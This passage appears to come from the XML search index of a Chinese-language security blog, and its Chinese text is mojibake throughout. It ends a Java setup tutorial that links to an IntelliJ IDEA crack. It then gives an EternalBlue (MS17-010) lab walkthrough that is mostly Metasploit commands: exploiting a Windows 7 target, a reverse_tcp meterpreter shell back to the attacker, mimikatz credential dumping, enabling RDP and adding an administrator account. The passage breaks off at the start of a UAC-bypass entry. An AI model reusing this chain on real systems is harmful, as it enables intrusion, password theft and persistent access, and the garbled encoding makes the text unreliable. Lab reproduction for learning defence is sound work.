ä¸éœ€è¦è¿›è¡ŒJavaç¨‹åºå¼€å‘ï¼Œåªæ˜¯è¦è¿è¡ŒJavaç¨‹åºï¼Œä¾‹å¦‚è¿è¡ŒJaræ–‡ä»¶ï¼Œé‚£ä¹ˆä½ å¯ä»¥åœ¨ä½ çš„è¿è¡Œæœºå™¨ä¸Šåªå®‰è£…JREã€‚</p><p>**JRE = Javaè™šæ‹Ÿæœº +Java APIç±»åº“ä¸­çš„Java SE APIå­é›† **</p></li><li><p>jvm(Java Virtual Machine)ï¼šjavaè™šæ‹Ÿæœº ï¼Œå…¶ä¸»è¦ä»»åŠ¡ä¸ºå°†å­—èŠ‚ç è£…è½½åˆ°å†…éƒ¨ï¼Œè§£é‡Š/ç¼–è¯‘ä¸ºå¯¹åº”å¹³å°ä¸Šçš„æœºå™¨æŒ‡ä»¤æ‰§è¡Œã€‚</p></li></ol><h2 id="Javaç¨‹åº"><a href="#Javaç¨‹åº" class="headerlink" title="Javaç¨‹åº"></a>Javaç¨‹åº</h2><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/javachengxu.png"></p><p>è¿‡ç¨‹ï¼š<strong>é¦–å…ˆæˆ‘ä»¬ä½¿ç”¨Javaç¼–ç¨‹è¯­è¨€ç¼–å†™å¥½Javaç¨‹åºçš„æºä»£ç ï¼Œç„¶åJavaå‰ç«¯ç¼–è¯‘å™¨è´Ÿè´£å°†æºä»£ç ç¼–è¯‘ä¸ºå­—èŠ‚ç ï¼Œæ¥ç€Javaè™šæ‹Ÿæœºè´Ÿè´£å°†ç¼–è¯‘å¥½çš„å­—èŠ‚ç è£…è½½è¿›å†…éƒ¨ï¼Œè§£é‡Š/ç¼–è¯‘ä¸ºå¯¹åº”å¹³å°ä¸Šçš„æœºå™¨æŒ‡ä»¤è¿è¡Œã€‚</strong></p><h1 id="Java-ç¯å¢ƒé…ç½®"><a href="#Java-ç¯å¢ƒé…ç½®" class="headerlink" title="Java ç¯å¢ƒé…ç½®"></a>Java ç¯å¢ƒé…ç½®</h1><p><strong>JDKä¸‹è½½</strong></p><p><a href="https://www.oracle.com/java/technologies/javase-downloads.html">https://www.oracle.com/java/technologies/javase-downloads.html</a></p><p>é…ç½®ç¯å¢ƒå˜é‡</p><p>æµ‹è¯•æ˜¯å¦å®‰è£…æˆåŠŸ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -version</span><br></pre></td></tr></table></figure><p><strong>IntelliJ IDEAå®˜æ–¹ä¸‹è½½</strong></p><p><a href="https://www.jetbrains.com/zh-cn/idea/download/#section=windows">https://www.jetbrains.com/zh-cn/idea/download/#section=windows</a> ã€éœ€ä»˜è´¹ä½¿ç”¨ï¼Œå¯å…è´¹ä½¿ç”¨30å¤©ã€‘</p><p><strong>IDEAç ´è§£</strong></p><p><a href="https://www.cxyxiaowu.com/14400.html">https://www.cxyxiaowu.com/14400.html</a></p><p><strong>IDEAé…ç½®</strong></p><p><a href="https://blog.csdn.net/DwZ735660836/article/details/115499367?spm=1001.2014.3001.5501">https://blog.csdn.net/DwZ735660836/article/details/115499367?spm=1001.2014.3001.5501</a></p><p>ä½¿ç”¨IDEAè¿è¡Œç¬¬ä¸€ä¸ªJavaç¨‹åº</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210716112614570.png" alt="image-20210716112614570"></p><h1 id="JavaåŸºç¡€è¯­æ³•"><a href="#JavaåŸºç¡€è¯­æ³•" class="headerlink" title="JavaåŸºç¡€è¯­æ³•"></a>JavaåŸºç¡€è¯­æ³•</h1><h2 id="Helloworldä»£ç "><a href="#Helloworldä»£ç " class="headerlink" title="Helloworldä»£ç "></a>Helloworldä»£ç </h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Hello</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello,world!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/javayufa.jpg"></p><h2 id="åŸºæœ¬è¯­æ³•"><a href="#åŸºæœ¬è¯­æ³•" class="headerlink" title="åŸºæœ¬è¯­æ³•"></a>åŸºæœ¬è¯­æ³•</h2><ul><li><strong>å¤§å°å†™æ•æ„Ÿ</strong></li><li><strong>ç±»åçš„é¦–å­—æ¯å¤§å†™</strong></li><li><strong>æ–¹æ³•å</strong>ï¼šæ‰€æœ‰çš„æ–¹æ³•åéƒ½åº”è¯¥ä»¥å°å†™å­—æ¯å¼€å¤´ã€‚å¦‚æœæ–¹æ³•åå«æœ‰è‹¥å¹²å•è¯ï¼Œåˆ™åé¢çš„æ¯ä¸ªå•è¯é¦–å­—æ¯å¤§å†™ã€‚</li><li><strong>æºæ–‡ä»¶å</strong>ï¼šæºæ–‡ä»¶åå¿…é¡»å’Œç±»åç›¸åŒã€‚ï¼ˆå¦‚æœæ–‡ä»¶åå’Œç±»åä¸ç›¸åŒåˆ™ä¼šå¯¼è‡´ç¼–è¯‘é”™è¯¯ï¼‰ã€‚</li><li><strong>ä¸»æ–¹æ³•å…¥å£</strong>ï¼šæ‰€æœ‰çš„ Java ç¨‹åºç”± <strong>public static void main(String[] args)</strong> æ–¹æ³•å¼€å§‹æ‰§è¡Œã€‚</li></ul><h2 id="æ ‡è¯†ç¬¦"><a href="#æ ‡è¯†ç¬¦" class="headerlink" title="æ ‡è¯†ç¬¦"></a>æ ‡è¯†ç¬¦</h2><ol><li>æ ‡è¯†ç¬¦ç”±å­—æ¯ã€æ•°å­—ã€_(ä¸‹åˆ’çº¿)ã€$æ‰€ç»„æˆï¼Œå…¶ä¸­ä¸èƒ½ä»¥æ•°å­—å¼€å¤´ï¼Œä¸èƒ½ç”¨Javaä¸­çš„ä¿ç•™å­—ï¼ˆå…³é”®å­—ï¼‰</li><li>æ ‡è¯†ç¬¦é‡‡ç”¨æœ‰æ„ä¹‰çš„ç®€å•å‘½å</li></ol><p><strong>å‘½åè§„èŒƒï¼ˆé©¼å³°å‘½åæ³•ï¼‰</strong></p><ul><li>ç±»åå’Œæ¥å£åï¼šæ¯ä¸ªå•è¯çš„é¦–å­—æ¯å¤§å†™ï¼Œå…¶ä½™ä¸ºå°å†™ã€‚ï¼ˆå¤§é©¼å³°ï¼‰</li><li>æ–¹æ³•åï¼šç¬¬äºŒä¸ªå•è¯èµ·çš„é¦–å­—æ¯ä¸ºå¤§å†™ï¼Œå…¶ä½™å…¨ä¸ºå°å†™ã€‚ï¼ˆå°é©¼å³°ï¼‰</li><li>å¸¸é‡åï¼šåŸºæœ¬æ•°æ®ç±»å‹çš„å¸¸é‡åä½¿ç”¨å…¨éƒ¨å¤§å†™å­—æ¯ï¼Œå­—ä¸å­—ä¹‹é—´ç”¨ä¸‹åˆ’çº¿åˆ†éš”ã€‚</li></ul><h2 id="ä¿®é¥°ç¬¦"><a href="#ä¿®é¥°ç¬¦" class="headerlink" title="ä¿®é¥°ç¬¦"></a>ä¿®é¥°ç¬¦</h2><p>è®¿é—®æ§åˆ¶ä¿®é¥°ç¬¦</p><table><thead><tr><th align="center">å…³é”®å­—</th><th align="left">å«ä¹‰</th></tr></thead><tbody><tr><td align="center">private</td><td align="left">ç§æœ‰æƒé™ï¼Œä¿®é¥°çš„å±æ€§å’Œæ–¹æ³•ä»…ä¾›æœ¬ç±»å¼•ç”¨</td></tr><tr><td align="center">protected</td><td align="left">ä¿æŠ¤æƒé™ï¼Œä¿æŠ¤å­ç±»ï¼Œå½“å‰åŒ…å†…å’Œç»§æ‰¿çš„å­ç±»ä¸­å¯ä»¥å¼•ç”¨</td></tr><tr><td align="center">default</td><td align="left">é»˜è®¤æ¨¡å¼ï¼Œä¸å†™ä»»ä½•è®¿é—®ä¿®é¥°æƒé™ï¼Œæœ¬åŒ…å†…å¯ä»¥ä½¿ç”¨</td></tr><tr><td align="center">public</td><td align="left">å…¬ç”¨æ¨¡å¼ï¼Œå¯è·¨åŒ…ä½¿ç”¨ï¼Œå‡¡æ˜¯ç¯å¢ƒä¸‹çš„ç±»å’Œæ–¹æ³•éƒ½å¯ä»¥ä½¿ç”¨ï¼Œéœ€å¯¼å…¥åŒ…</td></tr></tbody></table><p>å…¶ä»–ä¿®é¥°ç¬¦</p><table><thead><tr><th align="center">å…³é”®å­—</th><th align="left">å«ä¹‰</th></tr></thead><tbody><tr><td align="center">abstract</td><td align="left">è¡¨æ˜ç±»æˆ–è€…æˆå‘˜æ–¹æ³•å…·æœ‰æŠ½è±¡å±æ€§</td></tr><tr><td align="center">final</td><td align="left">ç»ˆç»“å™¨ï¼Œè¡¨æ˜ä¸€ä¸ªç±»ä¸èƒ½æ´¾ç”Ÿå‡ºå­ç±»ï¼Œæˆ–è€…æˆå‘˜æ–¹æ³•ä¸èƒ½è¢«è¦†ç›–ï¼Œæˆ–è€…æˆå‘˜åŸŸçš„å€¼ä¸èƒ½è¢«æ”¹å˜ï¼Œç”¨æ¥å®šä¹‰å¸¸é‡</td></tr><tr><td align="center">static</td><td align="left">è¡¨ç¤ºå…·æœ‰é™æ€å±æ€§</td></tr><tr><td align="center">synchronized</td><td align="left">çº¿ç¨‹åŒæ­¥ï¼Œä¿®é¥°ä¸€æ®µä»£ç è¡¨ç¤ºå¤šä¸ªçº¿ç¨‹éƒ½èƒ½åŒæ­¥æ‰§è¡Œ</td></tr></tbody></table><h2 id="å˜é‡"><a href="#å˜é‡" class="headerlink" title="å˜é‡"></a>å˜é‡</h2><p>Java ä¸­ä¸»è¦æœ‰å¦‚ä¸‹å‡ ç§ç±»å‹çš„å˜é‡</p><ul><li>å±€éƒ¨å˜é‡</li><li>ç±»å˜é‡ï¼ˆé™æ€å˜é‡ï¼‰</li><li>æˆå‘˜å˜é‡ï¼ˆéé™æ€å˜é‡ï¼‰</li></ul><h2 id="æ³¨é‡Š"><a href="#æ³¨é‡Š" class="headerlink" title="æ³¨é‡Š"></a>æ³¨é‡Š</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloWorld</span> </span>&#123;</span><br><span class="line">   <span class="comment">/* è¿™æ˜¯ç¬¬ä¸€ä¸ªJavaç¨‹åº</span></span><br><span class="line"><span class="comment">    * å®ƒå°†è¾“å‡º Hello World</span></span><br><span class="line"><span class="comment">    * è¿™æ˜¯ä¸€ä¸ªå¤šè¡Œæ³¨é‡Šçš„ç¤ºä¾‹</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">       <span class="comment">// è¿™æ˜¯å•è¡Œæ³¨é‡Šçš„ç¤ºä¾‹</span></span><br><span class="line">       <span class="comment">/* è¿™ä¸ªä¹Ÿæ˜¯å•è¡Œæ³¨é‡Šçš„ç¤ºä¾‹ */</span></span><br><span class="line">       System.out.println(<span class="string">&quot;Hello World&quot;</span>); </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><p>[1] <a href="https://blog.csdn.net/qq_39091292/article/details/84859611">JAVAä½“ç³»ç»“æ„</a></p><p>[2] <a href="https://blog.csdn.net/DwZ735660836/article/details/115485354?spm=1001.2014.3001.5502">javaå¼€å‘é…å¥—å·¥å…·ä¸‹è½½åœ°å€å’Œä»‹ç»</a></p><p>[3] <a href="https://blog.csdn.net/weixin_42318912/article/details/114176738?utm_medium=distribute.pc_relevant.none-task-blog-baidujs_title-0&spm=1001.2101.3001.4242">ideaåˆ›å»ºjavaé¡¹ç›®ç›®å½•ç»“æ„_ä½¿ç”¨IDEAåˆ›å»ºjavaé¡¹ç›®çš„æ­¥éª¤è¯¦è§£ï¼ˆhello wordï¼‰</a></p><p>[4] <a href="https://www.runoob.com/java/java-basic-syntax.html">https://www.runoob.com/java/java-basic-syntax.html</a></p>]]></content>
      
      
      <categories>
          
          <category> ç¼–ç¨‹è¯­è¨€ </category>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ms17_010-æ°¸æ’ä¹‹è“å¤ç°</title>
      <link href="posts/61895.html"/>
      <url>posts/61895.html</url>
      
        <content type="html"><![CDATA[<h1 id="ä»‹ç»"><a href="#ä»‹ç»" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h1><ul><li>Metasploitæ˜¯ä¸€ä¸ªå…è´¹çš„ã€å¯ä¸‹è½½çš„æ¡†æ¶ï¼Œé€šè¿‡å®ƒå¯ä»¥å¾ˆå®¹æ˜“åœ°è·å–ã€å¼€å‘å¹¶å¯¹è®¡ç®—æœºè½¯ä»¶æ¼æ´å®æ–½æ”»å‡»ã€‚å®ƒæœ¬èº«é™„å¸¦æ•°ç™¾ä¸ªå·²çŸ¥è½¯ä»¶æ¼æ´çš„ä¸“ä¸šçº§æ¼æ´æ”»å‡»å·¥å…·ã€‚</li><li>ms17_010æ˜¯ä¸€ä¸ªå®‰å…¨ç±»å‹çš„è¡¥ä¸ï¼Œç”¨æ¥ä¿®è¡¥Windowsæ“ä½œç³»ç»Ÿä¸­å­˜åœ¨çš„ä¸€ä¸ªåŸºäºSMBæœåŠ¡å±•ç°å‡ºæ¥çš„ä¸€ä¸ªæ¼æ´ï¼Œæ­¤æ¼æ´åˆ©ç”¨445ç«¯å£æ‰§è¡Œï¼ŒåŸæœ¬æ˜¯ä½œä¸ºå±€åŸŸç½‘å…±äº«ä½¿ç”¨çš„ä¸€ä¸ªç«¯å£ï¼Œä½†æ¶æ„äººå‘˜å¯ä»¥åˆ©ç”¨æ­¤ç«¯å£å·å·çš„æ‰§è¡Œå…±äº«æœåŠ¡æˆ–è€…å…¶ä»–å‘½ä»¤æ‰§è¡Œæ“ä½œã€‚æ­¤ms17_010æ¼æ´ä¸»è¦æ˜¯é’ˆå¯¹äºWindows7åŠä»¥å‰çš„æ“ä½œç³»ç»Ÿæš´éœ²å‡ºæ¥çš„å®‰å…¨é—®é¢˜ã€‚</li><li>æ°¸æ’ä¹‹è“ï¼ˆEternal Blueï¼‰çˆ†å‘äº2017å¹´4æœˆ14æ—¥æ™šï¼Œæ˜¯ä¸€ç§åˆ©ç”¨Windowsç³»ç»Ÿçš„SMBåè®®æ¼æ´æ¥è·å–ç³»ç»Ÿçš„æœ€é«˜æƒé™ï¼Œä»¥æ­¤æ¥æ§åˆ¶è¢«å…¥ä¾µçš„è®¡ç®—æœºã€‚ç”šè‡³äº2017å¹´5æœˆ12æ—¥ï¼Œ ä¸æ³•åˆ†å­é€šè¿‡æ”¹é€ â€œæ°¸æ’ä¹‹è“â€åˆ¶ä½œäº†wannacryå‹’ç´¢ç—…æ¯’ï¼Œä½¿å…¨ä¸–ç•Œå¤§èŒƒå›´å†…é­å—äº†è¯¥å‹’ç´¢ç—…æ¯’ï¼Œç”šè‡³æ³¢åŠåˆ°å­¦æ ¡ã€å¤§å‹ä¼ä¸šã€æ”¿åºœç­‰æœºæ„ï¼Œåªèƒ½é€šè¿‡æ”¯ä»˜é«˜é¢çš„èµé‡‘æ‰èƒ½æ¢å¤å‡ºæ–‡ä»¶ã€‚ä¸è¿‡åœ¨è¯¥ç—…æ¯’å‡ºæ¥ä¸ä¹…å°±è¢«å¾®è½¯é€šè¿‡æ‰“è¡¥ä¸ä¿®å¤ã€‚</li><li>SMBï¼ˆå…¨ç§°æ˜¯Server Message Blockï¼‰æ˜¯ä¸€ä¸ªåè®®æœåŠ¡å™¨ä¿¡æ¯å—ï¼Œå®ƒæ˜¯ä¸€ç§å®¢æˆ·æœº/æœåŠ¡å™¨ã€è¯·æ±‚/å“åº”åè®®ï¼Œé€šè¿‡SMBåè®®å¯ä»¥åœ¨è®¡ç®—æœºé—´å…±äº«æ–‡ä»¶ã€æ‰“å°æœºã€å‘½åç®¡é“ç­‰èµ„æºï¼Œç”µè„‘ä¸Šçš„ç½‘ä¸Šé‚»å±…å°±æ˜¯é SMBå®ç°çš„ï¼›SMBåè®®å·¥ä½œåœ¨åº”ç”¨å±‚å’Œä¼šè¯å±‚ï¼Œå¯ä»¥ç”¨åœ¨TCP/IPåè®®ä¹‹ä¸Šï¼ŒSMBä½¿ç”¨TCP139ç«¯å£å’ŒTCP445ç«¯å£ã€‚</li></ul><h1 id="å®éªŒ"><a href="#å®éªŒ" class="headerlink" title="å®éªŒ"></a>å®éªŒ</h1><p>æ”»å‡»æœºï¼škali 192.168.47.130</p><p>é¶æœºï¼šwindows7 192.168.47.128</p><p><strong>å½“ä½¿ç”¨nmapæˆ–å…¶ä»–å·¥å…·å‘ç°ç›®æ ‡åŠä¸Šæœ‰445ç«¯å£å¼€å¯ï¼Œå¯ä»¥è€ƒè™‘æ£€æµ‹æ˜¯å¦å­˜åœ¨æ°¸æ’ä¹‹è“</strong></p><p>ä½¿ç”¨pingå‘½ä»¤æµ‹è¯•ä¸¤å°æœºå™¨é—´ç½‘ç»œæ˜¯å¦äº’é€šï¼ˆwindows7è®°å¾—å…³é—­é˜²ç«å¢™ï¼ï¼‰</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210730162236059.png" alt="image-20210730162236059"></p><p>åœ¨kaliä¸­å¯åŠ¨metasploit</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure><p>æœç´¢ms17_010ç›¸å…³æ¼æ´åˆ©ç”¨æ¨¡å—</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search ms17_010</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210730162921120.png" alt="image-20210730162921120"></p><p>ä½¿ç”¨æ‰«ææ¨¡å—ï¼ˆæ‰«æç›®æ ‡æœºå™¨æ˜¯å¦å­˜åœ¨æ­¤æ¼æ´ï¼‰</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/smb/smb_ms17_010</span><br></pre></td></tr></table></figure><p>è®¾ç½®æ‰«æçš„ç½‘æ®µèŒƒå›´</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set rhosts 192.168.47.0&#x2F;24</span><br></pre></td></tr></table></figure><p>è®¾ç½®æ‰«æçš„çº¿ç¨‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set threads 50</span><br></pre></td></tr></table></figure><p>å¼€å§‹æ‰«æ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run</span><br></pre></td></tr></table></figure><p>æ‰«æç»“æŸåï¼Œä»ç»“æœä¸­å¯ä»¥çœ‹åˆ°åœ¨å½“å‰æ‰«æçš„ç½‘æ®µä¸­å­˜åœ¨ä¸€ä¸ªwindows7çš„æ“ä½œç³»ç»Ÿå­˜åœ¨ms17_010æ¼æ´</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210730165507338.png" alt="image-20210730165507338"></p><p>æ¥ä¸‹æ¥è¿›è¡Œæ¼æ´åˆ©ç”¨ï¼Œä½¿ç”¨æ¼æ´åˆ©ç”¨æ¨¡å—</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br></pre></td></tr></table></figure><p>è®¾ç½®æ¼æ´åˆ©ç”¨å®Œæˆåçš„åå¼¹æ¨¡å—ï¼Œç”¨ä»¥æ¥æ”¶å›é¦ˆä¿¡æ¯</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure><p>è®¾ç½®åå¼¹ipåœ°å€ï¼ˆå³kaliæ”»å‡»æœºipï¼‰</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> lhost 192.168.47.130</span><br></pre></td></tr></table></figure><p>è®¾ç½®åå¼¹ç«¯å£</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set lport 6666</span><br></pre></td></tr></table></figure><p>è®¾ç½®è¢«æ”»å‡»çš„ç›®æ ‡ä¸»æœºip</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> rhost 192.168.47.128</span><br></pre></td></tr></table></figure><p>æ£€æŸ¥è®¾ç½®çš„ä¿¡æ¯</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show options</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210730170329121.png" alt="image-20210730170329121"></p><p>å‡†å¤‡å·¥ä½œå®Œæˆï¼Œè¿›è¡Œæ”»å‡»</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210730170632714.png" alt="image-20210730170632714"></p><p>åç»­åˆ©ç”¨</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">getsystem // ææƒ</span><br><span class="line">getuid // æŸ¥çœ‹å½“å‰ç”¨æˆ·èº«ä»½</span><br><span class="line">sysinfo // æŸ¥çœ‹ç³»ç»Ÿä¿¡æ¯</span><br><span class="line">screenshot // æˆªå±</span><br><span class="line">webcam_list //æŸ¥çœ‹ç›®æ ‡æ‘„åƒå¤´è®¾å¤‡åˆ—è¡¨</span><br><span class="line">shell // è¿›å…¥é¶æœºcmdï¼ˆå¦‚æœå‡ºç°ä¹±ç çš„è¯æ‰§è¡Œchcp 65001ï¼‰</span><br></pre></td></tr></table></figure><p>ä¸Šä¼ æ–‡ä»¶</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">upload  &#x2F;aaa.exe  c:&#x2F;&#x2F; </span><br><span class="line">&#x2F;&#x2F;åœ¨kaliæ ¹ç›®å½•ä¸‹åˆ›å»ºäº†ä¸€ä¸ªaaa.exeçš„æ–‡ä»¶ï¼Œå°†å…¶ä¸Šä¼ è‡³ç›®æ ‡æ“ä½œç³»ç»Ÿå½“ä¸­Cç›˜ä¸‹</span><br></pre></td></tr></table></figure><p>è·å–å¯†ç </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">load mimikatz &#x2F;&#x2F;åŠ è½½è·å–å¯†ç çš„æ¨¡å—</span><br><span class="line">creds_msv &#x2F;&#x2F;è·å–å¯†æ–‡hashå€¼</span><br><span class="line">creds_kerberos &#x2F;&#x2F;è·å–æ˜æ–‡å¯†ç ****</span><br></pre></td></tr></table></figure><p><strong>è¿œç¨‹æ¡Œé¢è¿æ¥é¶æœº</strong></p><ol><li><p>æŸ¥çœ‹é¶æœºç«¯å£å¼€æ”¾æƒ…å†µ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -an</span><br></pre></td></tr></table></figure><p>å¦‚æœæ²¡æœ‰å¼€å¯3389ç«¯å£ï¼Œå¯ä»¥åœ¨cmdä¸­ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤å¼€å¯ï¼ˆWin7ã€Win2003ã€XPç³»ç»Ÿï¼‰</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span><br></pre></td></tr></table></figure></li><li><p>åˆ›å»ºç”¨æˆ·åå¯†ç  blue/blue </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user blue blue /add </span><br></pre></td></tr></table></figure><p>å°†ç”¨æˆ·blueæ·»åŠ å…¥ç®¡ç†ç»„ ï¼ˆä¸åŠ å…¥ä¼šè¿æ¥ä¸ä¸Šï¼‰ </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup administrators blue /add</span><br></pre></td></tr></table></figure></li><li><p>è¿œç¨‹æ¡Œé¢è¿æ¥ï¼ˆ<strong>è¿™é‡Œå‰ææ˜¯ç›®æ ‡æœºä¸æ˜¯æ™®é€šçš„å®¶åº­ç‰ˆï¼Œè¦æ”¯æŒè¿œç¨‹è¿æ¥</strong>ï¼‰</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rdesktop 192.168.47.128:3389</span><br></pre></td></tr></table></figure><p>é˜²èŒƒæªæ–½ï¼š</p></li></ol><ul><li>å…³é—­445ç­‰é«˜å±ç«¯å£</li><li>é…ç½®é˜²ç«å¢™ï¼Œå®‰è£…é˜²æŠ¤è½¯ä»¶</li><li>å®‰è£…è¡¥ä¸</li></ul>]]></content>
      
      
      <categories>
          
          <category> æ¼æ´å¤ç° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ATT&amp;CK </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç»•è¿‡UAC</title>
      <link href="posts/52267.html"/>
      <url>posts/52267.html</url>
      
        <content type="html"><![CDATA[<h1 id="ä»€ä¹ˆæ˜¯UACï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯UACï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯UACï¼Ÿ"></a>ä»€ä¹ˆæ˜¯UACï¼Ÿ</h1><p>ç”¨æˆ·å¸æˆ·æ§åˆ¶ï¼Œé€šå¸¸ç®€ç§° UACï¼Œæ˜¯ Windows Vista å’Œ Windows Server 2008ä¸­å¼•å…¥çš„ Windows å®‰å…¨ç»„ä»¶ã€‚UAC å°½å¯èƒ½é™åˆ¶è¿›ç¨‹å¯¹ç®¡ç†çº§(ç‰¹æƒ)èµ„æºå’Œæ“ä½œçš„è®¿é—®ï¼Œé™¤éç”¨æˆ·æ˜ç¡®æˆäºˆè¿™äº›æƒé™ã€‚æ¢å¥è¯è¯´ï¼Œå®ƒæ˜¯Windowsçš„ä¸€ä¸ªå®‰å…¨åŠŸèƒ½ï¼Œå®ƒæ”¯æŒé˜²æ­¢å¯¹æ“ä½œç³»ç»Ÿè¿›è¡Œæœªç»æˆæƒçš„ä¿®æ”¹ï¼ŒUACç¡®ä¿ä»…åœ¨ç®¡ç†å‘˜æˆæƒçš„æƒ…å†µä¸‹è¿›è¡ŒæŸäº›æ›´æ”¹ã€‚å¦‚æœç®¡ç†å‘˜ä¸å…è®¸æ›´æ”¹ï¼Œåˆ™ä¸ä¼šæ‰§è¡Œè¿™äº›æ›´æ”¹ï¼Œå¹¶ä¸”Windowsç³»ç»Ÿä¿æŒä¸å˜ã€‚</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210721141732437.png" alt="image-20210721141732437"></p><h1 id="UACå¦‚ä½•è¿è¡Œï¼Ÿ"><a href="#UACå¦‚ä½•è¿è¡Œï¼Ÿ" class="headerlink" title="UACå¦‚ä½•è¿è¡Œï¼Ÿ"></a>UACå¦‚ä½•è¿è¡Œï¼Ÿ</h1><p>UACé€šè¿‡é˜»æ­¢ç¨‹åºæ‰§è¡Œä»»ä½•æ¶‰åŠæœ‰å…³ç³»ç»Ÿæ›´æ”¹/ç‰¹å®šä»»åŠ¡çš„ä»»åŠ¡æ¥è¿è¡Œã€‚é™¤éå°è¯•æ‰§è¡Œè¿™äº›æ“ä½œçš„è¿›ç¨‹ä»¥ç®¡ç†å‘˜æƒé™è¿è¡Œï¼Œå¦åˆ™è¿™äº›æ“ä½œå°†æ— æ³•è¿è¡Œã€‚å¦‚æœæ‚¨ä»¥ç®¡ç†å‘˜èº«ä»½è¿è¡Œç¨‹åºï¼Œåˆ™å®ƒå°†å…·æœ‰æ›´å¤šæƒé™ï¼Œå› 